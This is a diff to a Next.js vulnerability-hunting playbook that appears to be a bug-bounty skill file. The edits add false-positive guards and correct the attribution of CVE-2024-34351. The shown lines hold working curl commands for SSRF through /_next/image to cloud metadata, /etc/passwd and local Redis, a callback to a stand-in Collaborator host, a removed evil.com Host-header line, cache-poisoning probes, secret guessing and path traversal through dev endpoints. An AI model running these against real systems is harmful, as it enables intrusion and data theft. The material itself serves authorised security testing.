@@ -1,8 +1,8 @@
 ---
 name: hunt-nextjs
 description: Hunt Next.js specific vulnerabilities — Server Actions arbitrary function execution, Middleware auth bypass via static asset paths, ISR cache poisoning, Image Optimization SSRF (/_next/image), RSC payload leakage, getServerSideProps injection, source map exposure, debug endpoint leakage. Use when target runs Next.js 13/14/15 or any React SSR framework.
-sources: hackerone_public, cve_database, portswigger_research
-report_count: 19
+sources: "cve_database (CVE-2024-34351 / GHSA-fr5h-rqp8-mj6g), Next.js advisories"
+report_count: 0
 ---
 
 # HUNT-NEXTJS — Next.js / SSR Framework Vulnerabilities
@@ -107,15 +107,26 @@ curl -s "https://$TARGET/_next/image?url=http://169.254.169.254/latest/meta-data
 curl -s "https://$TARGET/_next/image?url=file:///etc/passwd&w=64&q=75"
 curl -s "https://$TARGET/_next/image?url=http://127.0.0.1:6379/&w=64&q=75"
 
-# OOB detection
-COLLAB="http://COLLAB_HOST"
+# OOB detection — use a UNIQUE per-test subdomain so callbacks can't be confused
+COLLAB="http://UNIQUE.COLLAB_HOST"
 curl -s "https://$TARGET/_next/image?url=$COLLAB/nextjs-ssrf&w=64&q=75"
-# Check Interactsh/Burp Collaborator for DNS/HTTP callback
-
-# CVE-2024-34351 — Host header SSRF via image optimizer
-curl -s "https://$TARGET/_next/image?url=http://target.com/image.png&w=64&q=75" \
-  -H "Host: evil.com"
+# Check Interactsh/Burp Collaborator for DNS/HTTP callback on that exact subdomain
 ```
+
+**FALSE-POSITIVE GUARD (read before claiming SSRF):** `/_next/image` only
+fetches URLs allowed by `images.remotePatterns` / `images.domains` in
+`next.config.js`. A non-whitelisted `url` returns **400 by default** — that is
+the optimizer's normal allowlist rejection, NOT a "block" you bypassed. A **200**
+returns an *optimized image*, not the upstream response body, so a status code
+alone NEVER confirms SSRF. Confirm only via an **out-of-band callback to a unique
+Collaborator subdomain** (above), or by body-diffing a known-internal vs
+known-external target. Do not report on status code.
+
+> Note: CVE-2024-34351 (Next.js SSRF, GHSA-fr5h-rqp8-mj6g, affects 13.4.0
+> through < 14.1.1, fixed in 14.1.1) is a **Server Actions** SSRF — a relative
+> redirect that trusts the `Host` header — NOT a `/_next/image` bug, and it does
+> NOT affect Host-routed providers like Vercel. See Phase 2 for the Server
+> Actions surface.
 
 ---
 
@@ -148,7 +159,15 @@ curl -s "https://$TARGET/dashboard" | \
 # 2. Injected content cached and served to all users
 
 # Test: does query param affect cached page content?
-curl -s "https://$TARGET/blog/test-post?preview=<script>alert(1)</script>" | grep "script"
+# Use a UNIQUE marker (not a generic <script>) so a match proves YOUR input landed,
+# and confirm the response was actually CACHED + served to a DIFFERENT client.
+MARK="zqx$(date +%s)"
+# 1) Poison with the marker
+curl -s "https://$TARGET/blog/test-post?preview=<b>$MARK</b>" -o /dev/null
+# 2) Re-fetch the CLEAN url (no query) from a fresh client and grep the marker.
+#    Body-diff clean-vs-poisoned and check x-nextjs-cache / age headers — a reflected
+#    marker WITHOUT proof it persists in the cache key is just reflection, not poisoning.
+curl -si "https://$TARGET/blog/test-post" | grep -iE "$MARK|x-nextjs-cache|age:"
 
 # On-demand revalidation endpoint (if exposed)
 curl -s "https://$TARGET/api/revalidate?secret=GUESS&path=/blog/test"
@@ -159,12 +178,22 @@ curl -s "https://$TARGET/api/revalidate?token=GUESS&path=/admin"
 
 ## Phase 7 — Debug & Stack Frame Endpoints
 
-```bash
-# Next.js dev-mode endpoints sometimes leak to production
-curl -s "https://$TARGET/__nextjs_original-stack-frame?isServer=true&errorMessage=test"
-curl -s "https://$TARGET/__nextjs_launch-editor?file=../../etc/passwd&line=1"
+**Precondition:** `__nextjs_launch-editor` and `__nextjs_original-stack-frame`
+are react-dev-overlay middleware mounted ONLY under `next dev`. A production
+build (`next build && next start`) does not register these routes — a 404 here
+is the normal, expected result, not a "filter" you need to bypass. They are
+reachable ONLY in the rare misconfiguration of literally running `next dev` in
+production. Treat any non-404 as the real finding; do NOT report a 404/filtered
+response as confirmation.
 
-# Error overlay endpoint — file read primitive in misconfigured prod
+```bash
+# First confirm dev mode is actually exposed (anything but 404 = dev server in prod)
+curl -s -o /dev/null -w "%{http_code}" \
+  "https://$TARGET/__nextjs_original-stack-frame?isServer=true&errorMessage=test"
+
+# Only if the above is NOT 404: the launch-editor / stack-frame endpoints can
+# reference local files (file-read surface of a dev server wrongly exposed)
+curl -s "https://$TARGET/__nextjs_launch-editor?file=../../etc/passwd&line=1"
 curl -s "https://$TARGET/__nextjs_original-stack-frame" \
   --data '{"file":"/etc/passwd","line":1,"column":1}'
 ```
